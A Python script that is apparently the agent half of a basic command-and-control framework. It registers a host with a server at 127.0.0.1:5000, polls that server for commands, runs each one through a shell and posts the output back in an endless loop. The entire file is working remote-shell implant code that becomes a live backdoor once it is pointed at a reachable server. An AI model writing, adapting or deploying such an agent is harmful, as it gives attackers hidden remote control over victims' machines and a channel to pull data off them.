import requests
import subprocess
import platform
import os
import time

SERVER_URL = "http://127.0.0.1:5000"

agent_id = input("Enter agent ID: ")
os_type = platform.system()
current_dir = os.getcwd()

def register():
    try:
        res = requests.post(f"{SERVER_URL}/register", json={
            "agent_id": agent_id,
            "os": os_type,
            "cwd": current_dir
        })
        if res.status_code == 200:
            print(f"[Agent] Registered with server as {agent_id} ({os_type})")
        else:
            print(f"[Agent] Registration failed: {res.text}")
    except Exception as e:
        print(f"[Agent Error] Could not register: {e}")

def execute_task(task):
    global current_dir
    try:
        if task.startswith("cd "):
            new_dir = task.split(" ", 1)[1].strip()
            try:
                os.chdir(new_dir)
                current_dir = os.getcwd()
                return f"Changed directory to {current_dir}"
            except Exception as e:
                return f"[Error] {e}"

        result = subprocess.check_output(
            task, shell=True, stderr=subprocess.STDOUT, cwd=current_dir
        )
        return result.decode(errors="ignore")
    except subprocess.CalledProcessError as e:
        return f"[Error] {e.output.decode(errors='ignore')}"
    except Exception as e:
        return f"[Error] {e}"

def main():
    register()
    while True:
        try:
            res = requests.get(f"{SERVER_URL}/task/{agent_id}")
            if res.status_code == 200:
                task = res.json().get("task")
                if task:
                    print(f"[Agent] Task received: {task}")
                    output = execute_task(task)
                    requests.post(f"{SERVER_URL}/report", json={
                        "agent_id": agent_id,
                        "result": output,
                        "cwd": current_dir
                    })
                    print("[Agent] Sending result back...")
            time.sleep(2)
        except Exception as e:
            print(f"[Agent Error] {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
